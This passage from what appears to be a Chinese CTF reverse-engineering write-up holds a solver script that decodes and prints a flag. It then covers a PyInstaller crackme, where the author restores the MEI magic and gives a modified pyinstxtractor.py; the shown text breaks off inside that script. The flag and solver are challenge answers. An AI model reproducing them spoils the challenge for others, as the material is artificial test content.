class="hljs-number">0x3B</span>,<span class="hljs-number">0x70</span>,<br>    <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_even</span>(<span class="hljs-params">v</span>):  <br>    <span class="hljs-keyword">return</span> ((v ^ <span class="hljs-number">0x53</span>) + <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_odd</span>(<span class="hljs-params">v</span>):   <br>    <span class="hljs-keyword">return</span> (((v - <span class="hljs-number">14</span>) &amp; <span class="hljs-number">0xFF</span>) ^ <span class="hljs-number">0x43</span>) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    res = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(CMP_DATA[:<span class="hljs-number">50</span>]):<br>        res.append(inv_even(v) <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> inv_odd(v))<br>    s = <span class="hljs-built_in">bytes</span>(res)<br>    <span class="hljs-built_in">print</span>(s.decode(<span class="hljs-string">&quot;latin1&quot;</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solve()<br>NSSCTF&#123;C0ngr@tulation!Y0N_s33m_7o_b3_gO0d_@t_vm!!&#125;<br></code></pre></td></tr></table></figure><h2 id="CrackMe-F-Me"><a href="#CrackMe-F-Me" class="headerlink" title="CrackMe&amp;F***Me"></a>CrackMe&amp;F***Me</h2><p>也是第一次遇到这种题捏，好好学习学习</p><p>先用010将文件末尾改为MEI魔数，**(“MEI 魔术”是指 PyInstaller 打包后的 Windows 可执行文件头部的标记)**</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242911.png" alt="img"></p><p>直接解包会出错，只能解包部分，主要的函数无法解包，这里可以推测可能是对压缩部分有魔改的加密，可以将没有解包的部分内容提取出来，最后单独处理</p><p>这里我给出修改后的pyinstxtractor.py，这个脚本可以解包并且将没有解包成功的部分初始内容提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> marshal<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4 <span class="hljs-keyword">as</span> uniquename<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CTOCEntry</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, position, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name</span>):<br>        <span class="hljs-variable language_">self</span>.position = position<br>        <span class="hljs-variable language_">self</span>.cmprsdDataSize = cmprsdDataSize<br>        <span class="hljs-variable language_">self</span>.uncmprsdDataSize = uncmprsdDataSize<br>        <span class="hljs-variable language_">self</span>.cmprsFlag = cmprsFlag<br>        <span class="hljs-variable language_">self</span>.typeCmprsData = typeCmprsData<br>        <span class="hljs-variable language_">self</span>.name = name<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PyInstArchive</span>:<br>    PYINST20_COOKIE_SIZE = <span class="hljs-number">24</span><br>    PYINST21_COOKIE_SIZE = <span class="hljs-number">24</span> + <span class="hljs-number">64</span><br>    MAGIC = <span class="hljs-string">b&#x27;MEI\014\013\012\013\016&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, path</span>):<br>        <span class="hljs-variable language_">self</span>.filePath = path<br>        <span class="hljs-variable language_">self</span>.pycMagic = <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span><br>        <span class="hljs-variable language_">self</span>.barePycList = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.fPtr = <span class="hljs-built_in">open</span>(<span class="hljs-variable language_">self</span>.filePath, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.fileSize = os.stat(<span class="hljs-variable language_">self</span>.filePath).st_size<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error: Could not open &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.filePath))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.fPtr.close()<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Processing &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.filePath))<br>        searchChunkSize = <span class="hljs-number">8192</span><br>        endPos = <span class="hljs-variable language_">self</span>.fileSize<br>        <span class="hljs-variable language_">self</span>.cookiePos = -<span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> endPos &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : File is too short or truncated&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            startPos = endPos - searchChunkSize <span class="hljs-keyword">if</span> endPos &gt;= searchChunkSize <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>            chunkSize = endPos - startPos<br><br>            <span class="hljs-keyword">if</span> chunkSize &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC):<br>                <span class="hljs-keyword">break</span><br><br>            <span class="hljs-variable language_">self</span>.fPtr.seek(startPos, os.SEEK_SET)<br>            data = <span class="hljs-variable language_">self</span>.fPtr.read(chunkSize)<br>            offs = data.rfind(<span class="hljs-variable language_">self</span>.MAGIC)<br><br>            <span class="hljs-keyword">if</span> offs != -<span class="hljs-number">1</span>:<br>                <span class="hljs-variable language_">self</span>.cookiePos = startPos + offs<br>                <span class="hljs-keyword">break</span><br><br>            endPos = startPos + <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC) - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> startPos == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.cookiePos == -<span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : Missing cookie, unsupported pyinstaller version or not a pyinstaller archive&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos + <span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE, os.SEEK_SET)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;python&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-number">64</span>).lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Pyinstaller version: 2.1+&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.pyinstVer = <span class="hljs-number">21</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.pyinstVer = <span class="hljs-number">20</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Pyinstaller version: 2.0&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getCArchiveInfo</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pyinstVer == <span class="hljs-number">20</span>:<br>                <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos, os.SEEK_SET)<br>                (magic, lengthofPackage, toc, tocLen, pyver) = struct.unpack(<span class="hljs-string">&#x27;!8siiii&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos, os.SEEK_SET)<br>                (magic, lengthofPackage, toc, tocLen, pyver, pylibname) = struct.unpack(<span class="hljs-string">&#x27;!8sIIii64s&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-variable language_">self</span>.PYINST21_COOKIE_SIZE))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : The file is not a pyinstaller archive&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-variable language_">self</span>.pymaj, <span class="hljs-variable language_">self</span>.pymin = (pyver//<span class="hljs-number">100</span>, pyver%<span class="hljs-number">100</span>) <span class="hljs-keyword">if</span> pyver &gt;= <span class="hljs-number">100</span> <span class="hljs-keyword">else</span> (pyver//<span class="hljs-number">10</span>, pyver%<span class="hljs-number">10</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Python version: &#123;0&#125;.&#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.pymaj, <span class="hljs-variable language_">self</span>.pymin))<br><br>        tailBytes = <span class="hljs-variable language_">self</span>.fileSize - <span class="hljs-variable language_">self</span>.cookiePos - (<span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pyinstVer == <span class="hljs-number">20</span> <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.PYINST21_COOKIE_SIZE)<br>        <span class="hljs-variable language_">self</span>.overlaySize = lengthofPackage + tailBytes<br>        <span class="hljs-variable language_">self</span>.overlayPos = <span class="hljs-variable language_">self</span>.fileSize - <span class="hljs-variable language_">self</span>.overlaySize<br>        <span class="hljs-variable language_">self</span>.tableOfContentsPos = <span class="hljs-variable language_">self</span>.overlayPos + toc<br>        <span class="hljs-variable language_">self</span>.tableOfContentsSize = tocLen<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Length of package: &#123;0&#125; bytes&#x27;</span>.<span class="hljs-built_in">format</span>(lengthofPackage))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parseTOC</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.tableOfContentsPos, os.SEEK_SET)<br>        <span class="hljs-variable language_">self</span>.tocList = []<br>        parsedLen = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">while</span> parsedLen &lt; <span class="hljs-variable language_">self</span>.tableOfContentsSize:<br>            (entrySize,) = struct.unpack(<span class="hljs-string">&#x27;!i&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-number">4</span>))<br>            nameLen = struct.calcsize(<span class="hljs-string">&#x27;!iIIIBc&#x27;</span>)<br>            (entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name) = \<br>                struct.unpack(<span class="hljs-string">&#x27;!IIIBc&#123;0&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(entrySize - nameLen), <span class="hljs-variable language_">self</span>.fPtr.read(entrySize - <span class="hljs-number">4</span>))<br><br>            <span class="hljs-keyword">try</span>:<br>                name = name.decode(<span class="hljs-string">&quot;utf-8&quot;</span>).rstrip(<span class="hljs-string">&quot;\0&quot;</span>)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>                name = <span class="hljs-built_in">str</span>(uniquename())<br><br>            <span class="hljs-keyword">if</span> name.startswith(<span class="hljs-string">&quot;/&quot;</span>):<br>                name = name.lstrip(<span class="hljs-string">&quot;/&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">0</span>:<br>                name = <span class="hljs-built_in">str</span>(uniquename())<br><br>            <span class="hljs-variable language_">self</span>.tocList.append(CTOCEntry(<span class="hljs-variable language_">self</span>.overlayPos + entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name))<br>            parsedLen += entrySize<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Found &#123;0&#125; files in CArchive&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.tocList)))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_writeRawData</span>(<span class="hljs-params">self, filepath, data</span>):<br>        nm = filepath.replace(<span class="hljs-string">&#x27;\\&#x27;</span>, os.path.sep).replace(<span class="hljs-string">&#x27;/&#x27;</span>, os.path.sep).replace(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>)<br>        nmDir = os.path.dirname(nm)<br>        <span class="hljs-keyword">if</span> nmDir != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.exists(nmDir):<br>            os.makedirs(nmDir)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(nm, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_writePyc</span>(<span class="hljs-params">self, filename, data</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> pycFile:<br>            pycFile.write(<span class="hljs-variable language_">self</span>.pycMagic)<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.pymin &gt;= <span class="hljs-number">7</span>:<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">else</span>:<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.pymin &gt;= <span class="hljs-number">3</span>:<br>                    pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>            pycFile.write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_fixBarePycs</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> pycFile <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.barePycList:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pycFile, <span class="hljs-string">&#x27;r+b&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-variable language_">self</span>.pycMagic)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFiles</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Beginning extraction...please standby&#x27;</span>)<br>        extractionDir = os.path.join(os.getcwd(), os.path.basename(<span class="hljs-variable language_">self</span>.filePath) + <span class="hljs-string">&#x27;_extracted&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractionDir):<br>            os.mkdir(extractionDir)<br>        os.chdir(extractionDir)<br><br>        <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.tocList:<br>            <span class="hljs-variable language_">self</span>.fPtr.seek(entry.position, os.SEEK_SET)<br>            data = <span class="hljs-variable language_">self</span>.fPtr.read(entry.cmprsdDataSize)<br><br>            <span class="hljs-keyword">if</span> entry.cmprsFlag == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    data = zlib.decompress(data)<br>                    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) == entry.uncmprsdDataSize<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error decompressing &#123;0&#125;, saving raw. Reason: &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name, e))<br>                    <span class="hljs-variable language_">self</span>._writeRawData(entry.name + <span class="hljs-string">&quot;.raw&quot;</span>, data)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> entry.typeCmprsData <span class="hljs-keyword">in</span> (<span class="hljs-string">b&#x27;d&#x27;</span>, <span class="hljs-string">b&#x27;o&#x27;</span>):<br>                <span class="hljs-keyword">continue</span><br><br>            basePath = os.path.dirname(entry.name)<br>            <span class="hljs-keyword">if</span> basePath != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.exists(basePath):<br>                os.makedirs(basePath)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;s&#x27;</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Possible entry point: &#123;0&#125;.pyc&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                        <span class="hljs-variable language_">self</span>.barePycList.append(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                    <span class="hljs-variable language_">self</span>._writePyc(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br>                <span class="hljs-keyword">elif</span> entry.typeCmprsData <span class="hljs-keyword">in</span> (<span class="hljs-string">b&#x27;M&#x27;</span>, <span class="hljs-string">b&#x27;m&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;\r\n&#x27;</span>:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                            <span class="hljs-variable language_">self</span>.pycMagic = data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>                        <span class="hljs-variable language_">self</span>._writeRawData(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                            <span class="hljs-variable language_">self</span>.barePycList.append(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                        <span class="hljs-variable language_">self</span>._writePyc(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-variable language_">self</span>._writeRawData(entry.name, data)<br>                    <span class="hljs-keyword">if</span> entry.typeCmprsData <span class="hljs-keyword">in</span> (<span class="hljs-string">b&#x27;z&#x27;</span>, <span class="hljs-string">b&#x27;Z&#x27;</span>):<br>                        <span class="hljs-variable language_">self</span>._extractPyz(entry.name)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Failed to write &#123;0&#125;, saving raw. Reason: &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name, e))<br>                <span class="hljs-variable language_">self</span>._writeRawData(entry.name + <span class="hljs-string">&quot;.raw&quot;</span>, data)<br><br>        <span class="hljs-variable language_">self</span>._fixBarePycs()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_extractPyz</span>(<span class="hljs-params">self, name</span>):<br>        dirName = name + <span class="hljs-string">&#x27;_extracted&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dirName):<br>            os.mkdir(dirName)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            pyzMagic = f.read(<span class="hljs-number">4</span>)<br>            <span class="hljs-keyword">if</span> pyzMagic != <span class="hljs-string">b&#x27;PYZ\0&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Not a valid PYZ, saving raw&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>._writeRawData(name + <span class="hljs-string">&quot;.raw&quot;</span>, pyzMagic + f.read())<br>                <span class="hljs-keyword">return</span><br><br>            pyzPycMagic = f.read(<span class="hljs-number">4</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                <span class="hljs-variable language_">self</span>.pycMagic = pyzPycMagic<br>            <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.pycMagic != pyzPycMagic:<br>                <span class="hljs-variable language_">self</span>.pycMagic = pyzPycMagic<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Warning: pyc magic changed inside PYZ&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj != sys.version_info.major <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.pymin != sys.version_info.minor:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Python version mismatch, skipping PYZ extraction&#x27;</span>)<br>                